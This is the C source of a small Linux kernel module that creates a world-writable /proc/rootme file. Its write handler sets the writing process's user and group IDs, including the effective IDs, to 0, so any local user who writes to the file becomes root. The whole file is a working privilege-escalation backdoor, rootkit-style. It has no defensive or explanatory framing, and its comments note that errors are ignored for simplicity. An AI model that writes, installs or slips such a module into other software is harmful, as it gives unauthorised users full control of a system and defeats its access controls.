#include <linux/module.h>
#include <linux/cred.h>
#include <linux/uidgid.h>
#include <linux/proc_fs.h>

MODULE_LICENSE("GPL");

static struct proc_dir_entry *ent;

static ssize_t write_me(struct file *f, const char __user *b, size_t c, loff_t *p) {
    struct cred *cred = prepare_creds();
    if (cred) {
        cred->uid.val = 0;
        cred->gid.val = 0;
        cred->euid.val = 0;
        cred->egid.val = 0;
        commit_creds(cred);
    }
    return c;   // say we wrote everything
}

static const struct proc_ops ops = {
    .proc_write = write_me,
};

static int __init start(void) {
    ent = proc_create("rootme", 0666, NULL, &ops);   // make /proc/rootme
    return 0;   // ignore errors for simplicity
}

static void __exit end(void) {
    proc_remove(ent);
}

module_init(start);
module_exit(end);